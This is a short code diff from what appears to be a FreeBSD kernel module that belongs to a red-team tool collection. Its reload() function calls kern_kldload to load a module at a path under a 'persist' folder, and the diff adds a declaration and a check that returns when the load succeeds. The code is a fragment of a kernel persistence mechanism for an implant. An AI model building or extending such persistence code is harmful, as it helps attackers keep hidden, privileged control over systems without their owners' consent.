@@ -21,10 +21,12 @@
 #include <sys/eventhandler.h>
 
 
+extern int kern_kldload(struct thread *td, const char *filename);
 
 static void reload(void) {
     struct thread *td = curthread;  // Get current thread
     int error = kern_kldload(td, "/Red-Team-Tool-Collab/persist/kms.ko");
+    if (error == 0) {return;}
 }
 
 static int event_handler(struct module *module, int event, void *arg) {
